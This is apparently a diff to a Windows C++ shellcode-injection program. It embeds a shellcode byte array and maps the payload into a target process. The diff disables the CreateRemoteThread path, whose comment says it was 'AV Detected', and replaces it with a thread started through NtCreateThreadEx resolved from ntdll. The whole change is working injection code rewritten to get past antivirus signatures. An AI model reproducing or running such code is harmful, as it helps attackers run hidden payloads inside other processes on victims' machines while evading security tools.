@@ -30,6 +30,34 @@ typedef PVOID(WINAPI* MapViewOfFile3FunctionPointer)(
 	ULONG                  ParameterCount
 );
 
+typedef NTSTATUS(WINAPI* NtCreateThreadExFunctionPointer)
+(
+	OUT PHANDLE hThread,
+	IN ACCESS_MASK DesiredAccess,
+	IN LPVOID ObjectAttributes,
+	IN HANDLE ProcessHandle,
+	IN LPTHREAD_START_ROUTINE lpStartAddress,
+	IN LPVOID lpParameter,
+	IN BOOL CreateSuspended,
+	IN ULONG StackZeroBits,
+	IN ULONG SizeOfStackCommit,
+	IN ULONG SizeOfStackReserve,
+	OUT LPVOID lpBytesBuffer
+	);
+
+struct NtCreateThreadExBuffer
+{
+	ULONG Size;
+	ULONG Unknown1;
+	ULONG Unknown2;
+	PULONG Unknown3;
+	ULONG Unknown4;
+	ULONG Unknown5;
+	ULONG Unknown6;
+	PULONG Unknown7;
+	ULONG Unknown8;
+};
+
 BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress) {
 
 	BOOL   bSTATE = TRUE;
@@ -142,12 +170,13 @@ int main() {
         "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
         "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
-	// LOCAL INJECTION
 	PVOID injectedAdress = NULL;
 	DWORD threadId = 0;
 	HANDLE hThread = NULL;
 
-	
+	// LOCAL INJECTION
+
+	/*
 	if (!LocalMapInject((BYTE*)shellcode, sizeof(shellcode), &injectedAdress)) {
 		std::cout << "[!] Error Injecting" << std::endl;
 	}
@@ -160,7 +189,7 @@ int main() {
 
 	std::cout << "[+] Injected Thread ID: " << threadId << std::endl;
 	WaitForSingleObject(hThread, INFINITE);
-	
+	*/
 
 
 	// REMOTE INJECTION
@@ -175,7 +204,8 @@ int main() {
 		std::cout << "[!] Error Injecting" << std::endl;
 	}
 
-	// AV Signature
+	// AV Detected
+	/*
 	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)injectedAdress, NULL, 0, &threadId);
 	if (hThread == NULL) {
 		std::cout << "[!] Error: " << GetLastError() << std::endl;
@@ -184,6 +214,47 @@ int main() {
 
 	std::cout << "[+] Injected Thread ID: " << threadId << std::endl;
 	WaitForSingleObject(hThread, INFINITE);
+	*/
+	// NTDLL
+	HMODULE hModuleNtdll = LoadLibraryA("ntdll.dll");
+	NtCreateThreadExFunctionPointer NtCreateThreadEx = (NtCreateThreadExFunctionPointer)GetProcAddress(hModuleNtdll, "NtCreateThreadEx");
+
+	if (!NtCreateThreadEx)
+	{
+		std::cout << "[+] Failed to load NtCreateThreadEx because of error: " << GetLastError() << std::endl;
+		return 1;
+	}
+
+	//setup and initialize the buffer
+	NtCreateThreadExBuffer ntbuffer;
+
+	memset(&ntbuffer, 0, sizeof(NtCreateThreadExBuffer));
+	DWORD temp1 = 0;
+	DWORD temp2 = 0;
+
+	ntbuffer.Size = sizeof(NtCreateThreadExBuffer);
+	ntbuffer.Unknown1 = 0x10003;
+	ntbuffer.Unknown2 = 0x8;
+	ntbuffer.Unknown3 = &temp2;
+	ntbuffer.Unknown4 = 0;
+	ntbuffer.Unknown5 = 0x10004;
+	ntbuffer.Unknown6 = 4;
+	ntbuffer.Unknown7 = &temp1;
+	ntbuffer.Unknown8 = 0;
+
+	NTSTATUS status = NtCreateThreadEx(
+		&hThread,
+		0x1FFFFF,
+		NULL,
+		hProcess,
+		(LPTHREAD_START_ROUTINE)injectedAdress,
+		NULL,
+		FALSE, //start instantly
+		NULL,
+		NULL,
+		NULL,
+		&ntbuffer
+	);
 
 	return 0;
 }
